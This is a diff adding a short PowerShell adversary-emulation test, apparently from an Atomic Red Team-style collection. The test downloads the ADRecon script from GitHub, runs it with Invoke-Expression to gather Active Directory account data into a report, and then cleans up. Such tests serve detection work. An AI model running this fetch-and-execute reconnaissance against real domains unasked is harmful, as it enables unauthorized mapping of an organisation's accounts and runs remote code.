@@ -1,0 +1,17 @@
+#TechniqueName: Account Discovery: Domain Account
+#AtomicTestName: Automated AD Recon (ADRecon)
+#Description: ADRecon extracts and combines information about an AD environement into a report. Upon execution, an Excel file with all of the data will be generated and its&path will be displayed.&
+#Language: ps1
+
+#get_prereq_commands
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sense-of-security/ADRecon/38e4abae3e26d0fa87281c1d0c65cabd4d3c6ebd/ADRecon.ps1" -OutFile $env:TEMP\ADRecon.ps1
+
+
+#commands
+Invoke-Expression $env:TEMP\ADRecon.ps1
+
+
+#cleanup_commands
+Remove-Item $env:TEMP\ADRecon.ps1 -Force -ErrorAction Ignore | Out-Null
+Get-ChildItem $env:TEMP -Recurse -Force | Where{$_.Name -Match "^ADRecon-Report-"} | Remove-Item -Force -Recurse
+
